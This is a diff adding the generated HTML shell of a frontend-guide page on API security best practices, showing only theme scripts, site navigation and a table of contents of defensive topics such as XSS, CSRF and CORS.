@@ -1,0 +1,2521 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://captain-rengoku.github.io/mkdocs-frontend-guide/reactapi/14.7.Security%20%26%20Best%20Practices/">
+      
+      
+        <link rel="prev" href="../14.6.Real-Time%20Data/">
+      
+      
+        <link rel="next" href="../14.8.File%20Handling/">
+      
+      
+      <link rel="icon" href="../../assets/code-solid-full.svg">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.50">
+    
+    
+      
+        <title>14.7.Security & Best Practices - My Frontend Guide</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.a40c8224.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Merriweather+Sans:300,300i,400,400i,700,700i%7CRed+Hat+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Merriweather Sans";--md-code-font:"Red Hat Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+   <link href="../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
+    html.glightbox-open { overflow: initial; height: 100%; }
+    .gslide-title { margin-top: 0px; user-select: text; }
+    .gslide-desc { color: #666; user-select: text; }
+    .gslide-image img { background: white; }
+    .gscrollbar-fixer { padding-right: 15px; }
+    .gdesc-inner { font-size: 0.75rem; }
+    body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
+    body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
+    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style> <script src="../../assets/javascripts/glightbox.min.js"></script></head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="deep-orange">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#api-security-best-practices" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="My Frontend Guide" class="md-header__button md-logo" aria-label="My Frontend Guide" data-md-component="logo">
+      
+  <img src="../../assets/code-solid-full.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            My Frontend Guide
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              14.7.Security & Best Practices
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="deep-orange"  aria-label="Dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="teal"  aria-label="Light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../react/react-list/" class="md-tabs__link">
+          
+  
+    
+  
+  React Docs
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../14.API%20Integration/" class="md-tabs__link">
+          
+  
+    
+  
+  API Integration
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../ts/ts-list/" class="md-tabs__link">
+          
+  
+    
+  
+  TypeScript Docs
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../nextjs/nextjs-list/" class="md-tabs__link">
+          
+  
+    
+  
+  Next.js Docs
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../Github%20Repositories/React%20Learning%20Journey/" class="md-tabs__link">
+        
+  
+    
+  
+  Github Repositories
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="My Frontend Guide" class="md-nav__button md-logo" aria-label="My Frontend Guide" data-md-component="logo">
+      
+  <img src="../../assets/code-solid-full.svg" alt="logo">
+
+    </a>
+    My Frontend Guide
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../react/react-list/" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    React Docs
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    API Integration
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            API Integration
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../14.API%20Integration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    14.API Integration
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../14.0.JSON%20Server/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    14.0.JSON Server
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../14.1.Core%20Fundamentals/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    14.1.Core Fundamentals
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../14.2.0.Axios/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    14.2.0.Axios
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../14.2.1.Axios%20Industry%20Standards/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    14.2.1.Axios Industry Standards
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../14.3.Authentication/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    14.3.Authentication
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../14.4.Advanced%20API%20Scenarios/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    14.4.Advanced API Scenarios
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../14.5.1.State%20Management%20with%20API%20Data/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    14.5.1.State Management with API Data
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../14.5.2.React%20Query/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    14.5.2.React Query
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../14.5.3.React%20Query%20Ref/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    14.5.3.React Query Ref
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../14.6.Real-Time%20Data/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    14.6.Real-Time Data
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    14.7.Security & Best Practices
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    14.7.Security & Best Practices
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-the-browser-threat-model" class="md-nav__link">
+    <span class="md-ellipsis">
+      1️⃣ The Browser Threat Model
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1️⃣ The Browser Threat Model">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#the-same-origin-mental-model" class="md-nav__link">
+    <span class="md-ellipsis">
+      The "same-origin" mental model
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-cross-site-scripting-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      2️⃣ Cross-Site Scripting (XSS)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2️⃣ Cross-Site Scripting (XSS)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#how-xss-happens" class="md-nav__link">
+    <span class="md-ellipsis">
+      How XSS happens
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#why-react-is-mostly-safe-by-default" class="md-nav__link">
+    <span class="md-ellipsis">
+      Why React is mostly safe by default
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#why-xss-breaks-localstorage-token-storage" class="md-nav__link">
+    <span class="md-ellipsis">
+      Why XSS breaks localStorage token storage
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-mitigations" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS mitigations
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XSS mitigations">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-output-encoding-let-react-do-it" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Output encoding (let React do it)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-sanitize-when-you-must-render-html" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Sanitize when you must render HTML
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-content-security-policy-csp-defense-in-depth" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Content Security Policy (CSP) — defense in depth
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-cross-site-request-forgery-csrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      3️⃣ Cross-Site Request Forgery (CSRF)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3️⃣ Cross-Site Request Forgery (CSRF)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#defense-1-samesite-cookies-your-first-line" class="md-nav__link">
+    <span class="md-ellipsis">
+      Defense 1 — SameSite cookies (your first line)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#defense-2-csrf-tokens-synchronizer-token-pattern" class="md-nav__link">
+    <span class="md-ellipsis">
+      Defense 2 — CSRF tokens (synchronizer token pattern)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#defense-3-double-submit-cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      Defense 3 — Double-submit cookie
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-https-hsts" class="md-nav__link">
+    <span class="md-ellipsis">
+      4️⃣ HTTPS &amp; HSTS
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-secure-token-storage-trade-offs" class="md-nav__link">
+    <span class="md-ellipsis">
+      5️⃣ Secure Token Storage Trade-offs
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5️⃣ Secure Token Storage Trade-offs">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#the-recommended-pattern" class="md-nav__link">
+    <span class="md-ellipsis">
+      The recommended pattern
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-cors-a-browser-policy-not-authentication" class="md-nav__link">
+    <span class="md-ellipsis">
+      6️⃣ CORS — A Browser Policy, Not Authentication
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6️⃣ CORS — A Browser Policy, Not Authentication">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-actually-happens" class="md-nav__link">
+    <span class="md-ellipsis">
+      What actually happens
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-secrets-handling-never-ship-secrets-to-the-client" class="md-nav__link">
+    <span class="md-ellipsis">
+      7️⃣ Secrets Handling — Never Ship Secrets to the Client
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="7️⃣ Secrets Handling — Never Ship Secrets to the Client">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#build-time-env-vars-are-embedded-not-hidden" class="md-nav__link">
+    <span class="md-ellipsis">
+      Build-time env vars are embedded, not hidden
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-input-validation-response-validation-zod" class="md-nav__link">
+    <span class="md-ellipsis">
+      8️⃣ Input Validation &amp; Response Validation (Zod)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="8️⃣ Input Validation & Response Validation (Zod)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#validating-api-responses-with-zod" class="md-nav__link">
+    <span class="md-ellipsis">
+      Validating API responses with Zod
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-rate-limiting-abuse-the-clients-role" class="md-nav__link">
+    <span class="md-ellipsis">
+      9️⃣ Rate Limiting &amp; Abuse — The Client's Role
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="9️⃣ Rate Limiting & Abuse — The Client's Role">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#be-a-good-client" class="md-nav__link">
+    <span class="md-ellipsis">
+      Be a good client
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#handle-429-correctly-respect-retry-after" class="md-nav__link">
+    <span class="md-ellipsis">
+      Handle 429 correctly (respect Retry-After)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dependency-supply-chain-hygiene" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔟 Dependency &amp; Supply-Chain Hygiene
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#11-secure-http-headers" class="md-nav__link">
+    <span class="md-ellipsis">
+      1️⃣1️⃣ Secure HTTP Headers
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#12-logging-pii-concerns" class="md-nav__link">
+    <span class="md-ellipsis">
+      1️⃣2️⃣ Logging &amp; PII Concerns
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#actionable-best-practices-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      ✅ Actionable Best-Practices Checklist
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../14.8.File%20Handling/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    14.8.File Handling
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../ts/ts-list/" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    TypeScript Docs
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../nextjs/nextjs-list/" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Next.js Docs
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Github%20Repositories/React%20Learning%20Journey/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Github Repositories
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-the-browser-threat-model" class="md-nav__link">
+    <span class="md-ellipsis">
+      1️⃣ The Browser Threat Model
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1️⃣ The Browser Threat Model">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#the-same-origin-mental-model" class="md-nav__link">
+    <span class="md-ellipsis">
+      The "same-origin" mental model
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-cross-site-scripting-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      2️⃣ Cross-Site Scripting (XSS)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2️⃣ Cross-Site Scripting (XSS)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#how-xss-happens" class="md-nav__link">
+    <span class="md-ellipsis">
+      How XSS happens
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#why-react-is-mostly-safe-by-default" class="md-nav__link">
+    <span class="md-ellipsis">
+      Why React is mostly safe by default
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#why-xss-breaks-localstorage-token-storage" class="md-nav__link">
+    <span class="md-ellipsis">
+      Why XSS breaks localStorage token storage
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-mitigations" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS mitigations
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XSS mitigations">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-output-encoding-let-react-do-it" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Output encoding (let React do it)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-sanitize-when-you-must-render-html" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Sanitize when you must render HTML
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-content-security-policy-csp-defense-in-depth" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Content Security Policy (CSP) — defense in depth
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
